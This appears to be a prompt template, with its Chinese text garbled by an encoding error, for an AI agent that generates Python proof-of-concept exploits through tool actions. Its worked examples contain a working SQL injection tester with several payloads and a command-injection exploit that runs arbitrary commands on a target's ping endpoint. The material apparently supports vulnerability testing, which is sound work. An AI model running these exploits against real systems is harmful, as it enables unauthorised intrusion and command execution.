## Python POC ä»£ç ç”Ÿæˆè¾“å‡ºæ ¼å¼ç¤ºä¾‹

ä½ çš„å·¥ä½œæµç¨‹å¿…é¡»éµå¾ªä»¥ä¸‹åè®®ï¼š

*   **åˆå§‹ç¼–ç **: ä½¿ç”¨ `write_python_poc` ç”Ÿæˆåˆå§‹ Python POC ä»£ç ã€‚
*   **è¿­ä»£ä¿®æ”¹**: åç»­æ‰€æœ‰ä¿®æ”¹éƒ½åº”ä½¿ç”¨ `modify_python_poc`ã€‚
*   **è¯­æ³•éªŒè¯**: æ¯æ¬¡ç”Ÿæˆæˆ–ä¿®æ”¹ä»£ç åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è¿›è¡Œ Python è¯­æ³•æ£€æŸ¥ã€‚

### è¯Šæ–­ä¼˜å…ˆåŸåˆ™ (Diagnose-Before-Treat Protocol)

1.  åœ¨ `modify_python_poc` åï¼Œä»”ç»†åˆ†æè¿”å›çš„ `syntax error`ã€‚
2.  å¦‚æœæœ‰è¯­æ³•é”™è¯¯ï¼Œä½ **å¿…é¡»ç«‹å³ä¿®å¤**ï¼Œä¸è¦çŒœæµ‹ã€‚
3.  åªæœ‰åœ¨ä»£ç è¯­æ³•å®Œå…¨æ­£ç¡®åï¼Œæ‰èƒ½é€€å‡ºä¸“æ³¨æ¨¡å¼ã€‚

**ç¦æ­¢çŒœæµ‹**: ä¸¥ç¦åœ¨ä¸ç†è§£é”™è¯¯æ ¹æºçš„æƒ…å†µä¸‹ï¼Œè¿ç»­ä½¿ç”¨ `modify_python_poc` è¿›è¡Œè¯•æ¢æ€§ä¿®å¤ã€‚

---

### æ­£ç¡®ç¤ºä¾‹ 1: `write_python_poc` åŠ¨ä½œï¼ˆåˆ›å»ºæ–°ä»£ç ï¼‰

```json
{"@action": "write_python_poc", "human_readable_thought": "æ ¹æ®æ¼æ´ä¿¡æ¯åˆ›å»ºä¸€ä¸ªSQLæ³¨å…¥POC"}
```

<|GEN_PYTHON_POC_{{ .Nonce }}|>
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL Injection POC
Target: Example vulnerable endpoint
"""

import requests
import sys
from urllib.parse import urljoin

class SQLInjectionPOC:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
    
    def check_vulnerability(self):
        """æ£€æµ‹SQLæ³¨å…¥æ¼æ´æ˜¯å¦å­˜åœ¨"""
        payload = "' OR '1'='1"
        try:
            resp = self.session.get(
                urljoin(self.target_url, f"/search?q={payload}"),
                timeout=self.timeout
            )
            if "error in your SQL syntax" in resp.text.lower():
                return True, "SQL injection vulnerability detected!"
            return False, "Target appears not vulnerable"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def exploit(self, payload):
        """åˆ©ç”¨SQLæ³¨å…¥æ¼æ´"""
        try:
            resp = self.session.get(
                urljoin(self.target_url, f"/search?q={payload}"),
                timeout=self.timeout
            )
            return resp.text
        except Exception as e:
            return f"Exploit failed: {str(e)}"

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    poc = SQLInjectionPOC(target_url)
    
    print(f"[*] Testing target: {target_url}")
    is_vuln, msg = poc.check_vulnerability()
    print(f"[{'+'if is_vuln else '-'}] {msg}")

if __name__ == "__main__":
    main()
<|GEN_PYTHON_POC_END_{{ .Nonce }}|>

### æ­£ç¡®ç¤ºä¾‹ 2: `modify_python_poc` åŠ¨ä½œï¼ˆä¿®æ”¹ç°æœ‰ä»£ç ï¼‰

```json
{"@action": "modify_python_poc", "modify_start_line": 18, "modify_end_line": 25, "modify_code_reason": "æ·»åŠ æ›´å¤šçš„payloadæµ‹è¯•ç”¨ä¾‹"}
```

<|GEN_PYTHON_POC_{{ .Nonce }}|>
    def check_vulnerability(self):
        """æ£€æµ‹SQLæ³¨å…¥æ¼æ´æ˜¯å¦å­˜åœ¨"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "1' AND '1'='1",
            "1 UNION SELECT NULL--"
        ]
        for payload in payloads:
            try:
                resp = self.session.get(
                    urljoin(self.target_url, f"/search?q={payload}"),
                    timeout=self.timeout
                )
                if "error in your SQL syntax" in resp.text.lower():
                    return True, f"SQL injection detected with payload: {payload}"
            except Exception as e:
                continue
        return False, "Target appears not vulnerable"
<|GEN_PYTHON_POC_END_{{ .Nonce }}|>

---

## ğŸ“‹ Action ç±»å‹æ€»ç»“

### éœ€è¦ `<|GEN_PYTHON_POC...|>` æ ‡ç­¾çš„ Actionsï¼š
- âœ… `write_python_poc` - åˆ›å»ºæ–°çš„ Python POC æ–‡ä»¶
- âœ… `modify_python_poc` - ä¿®æ”¹ç°æœ‰ Python POC ä»£ç ç‰‡æ®µ

### ä¸éœ€è¦ `<|GEN_PYTHON_POC...|>` æ ‡ç­¾çš„ Actionsï¼š
- âŒ `directly_answer` - ç›´æ¥å›ç­”ï¼ˆæ— éœ€ç”Ÿæˆä»£ç ï¼‰

**è®°å¿†å£è¯€**: åªæœ‰éœ€è¦ä½ "ç”Ÿæˆæˆ–æä¾›ä»£ç ç‰‡æ®µ"çš„ actions æ‰éœ€è¦ `<|GEN_PYTHON_POC...|>` æ ‡ç­¾ï¼

---

## âŒ å¸¸è§é”™è¯¯ç¤ºä¾‹

### é”™è¯¯ç¤ºä¾‹ 1ï¼šä½¿ç”¨ markdown ä»£ç å—ï¼ˆç»å¯¹ç¦æ­¢ï¼ï¼‰

```json
{"@action": "write_python_poc", "human_readable_thought": "åˆ›å»ºPOC"}
```

```python
#!/usr/bin/env python3
import requests
# è¿™æ˜¯é”™è¯¯çš„ï¼
```

âš ï¸ **è¿™ç§æ ¼å¼æ˜¯é”™è¯¯çš„ï¼å¿…é¡»ä½¿ç”¨ `<|GEN_PYTHON_POC_xxx|>` æ ‡ç­¾ï¼Œä¸èƒ½ä½¿ç”¨ markdown ä»£ç å—ï¼**

### é”™è¯¯ç¤ºä¾‹ 2ï¼šåŒ…å«è¡Œå·å‰ç¼€ï¼ˆç»å¯¹ç¦æ­¢ï¼ï¼‰

```json
{"@action": "modify_python_poc", "modify_start_line": 18, "modify_end_line": 25}
```

<|GEN_PYTHON_POC_{{ .Nonce }}|>
18 |     def check_vulnerability(self):
19 |         """æ£€æµ‹æ¼æ´"""
<|GEN_PYTHON_POC_END_{{ .Nonce }}|>

âš ï¸ **è¿™ç§æ ¼å¼æ˜¯é”™è¯¯çš„ï¼åŒ…å«è¡Œå·ä¼šå¯¼è‡´è¯­æ³•è§£æå¤±è´¥ï¼**

---

## âœ… å®Œæ•´å·¥ä½œæµç¤ºä¾‹

### ç¤ºä¾‹ï¼šåˆ›å»º RCE æ¼æ´ POC

**æ­¥éª¤1ï¼šåˆ›å»ºåˆå§‹ä»£ç **
```json
{"@action": "write_python_poc", "human_readable_thought": "æ ¹æ®æ¼æ´åˆ†æï¼Œåˆ›å»ºä¸€ä¸ªRCEæ¼æ´çš„POC"}
```

<|GEN_PYTHON_POC_{{ .Nonce }}|>
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Remote Code Execution POC
Vulnerability: Command Injection in /api/ping endpoint
"""

import requests
import sys

class RCEExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def check(self):
        """æ£€æµ‹RCEæ¼æ´"""
        payload = "; id"
        resp = self.session.post(
            f"{self.target_url}/api/ping",
            data={"host": f"127.0.0.1{payload}"}
        )
        if "uid=" in resp.text:
            return True, resp.text
        return False, "Not vulnerable"
    
    def exploit(self, cmd):
        """æ‰§è¡Œä»»æ„å‘½ä»¤"""
        payload = f"; {cmd}"
        resp = self.session.post(
            f"{self.target_url}/api/ping",
            data={"host": f"127.0.0.1{payload}"}
        )
        return resp.text

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 rce_poc.py <target_url> [command]")
        sys.exit(1)
    
    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    
    poc = RCEExploit(target)
    print(f"[*] Target: {target}")
    
    is_vuln, result = poc.check()
    if is_vuln:
        print(f"[+] Vulnerable! Executing command: {cmd}")
        output = poc.exploit(cmd)
        print(output)
    else:
        print("[-] Target not vulnerable")

if __name__ == "__main__":
    main()
<|GEN_PYTHON_POC_END_{{ .Nonce }}|>

**æ­¥éª¤2ï¼šå¦‚æœè¯­æ³•æ£€æŸ¥æœ‰é”™è¯¯ï¼Œä¿®å¤å®ƒ**
```json
{"@action": "modify_python_poc", "modify_start_line": 15, "modify_end_line": 20, "modify_code_reason": "ä¿®å¤è¯­æ³•é”™è¯¯ï¼Œæ·»åŠ å¼‚å¸¸å¤„ç†"}
```

<|GEN_PYTHON_POC_{{ .Nonce }}|>
    def check(self):
        """æ£€æµ‹RCEæ¼æ´"""
        payload = "; id"
        try:
            resp = self.session.post(
                f"{self.target_url}/api/ping",
                data={"host": f"127.0.0.1{payload}"},
                timeout=10
            )
            if "uid=" in resp.text:
                return True, resp.text
            return False, "Not vulnerable"
        except requests.RequestException as e:
            return False, f"Request failed: {e}"
<|GEN_PYTHON_POC_END_{{ .Nonce }}|>

**æ­¥éª¤3ï¼šç¡®è®¤ä»£ç å®Œæˆ**
```json
{"@action": "directly_answer", "human_readable_thought": "Python POCä»£ç å·²ç”Ÿæˆå®Œæˆï¼Œè¯­æ³•æ£€æŸ¥é€šè¿‡ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨"}
```

---

## é‡è¦æé†’

1. **å¿…é¡»ä½¿ç”¨æ­£ç¡®çš„æ ‡ç­¾æ ¼å¼**: `<|GEN_PYTHON_POC_xxx|>` å’Œ `<|GEN_PYTHON_POC_END_xxx|>`
2. **ç¦æ­¢ä½¿ç”¨ markdown ä»£ç å—**: ä¸è¦ç”¨ \`\`\`python ... \`\`\` æ ¼å¼
3. **ä»£ç ä¸è¦åŒ…å«è¡Œå·**: ç›´æ¥å†™ä»£ç ï¼Œä¸è¦åœ¨å‰é¢åŠ è¡Œå·
4. **ç¡®ä¿è¯­æ³•æ­£ç¡®**: ç³»ç»Ÿä¼šè‡ªåŠ¨æ£€æŸ¥ Python è¯­æ³•ï¼Œæœ‰é”™è¯¯å¿…é¡»ä¿®å¤
5. **å®Œæ•´çš„ä»£ç ç»“æ„**: åŒ…å«å¿…è¦çš„å¯¼å…¥ã€ç±»å®šä¹‰ã€main å‡½æ•°ç­‰
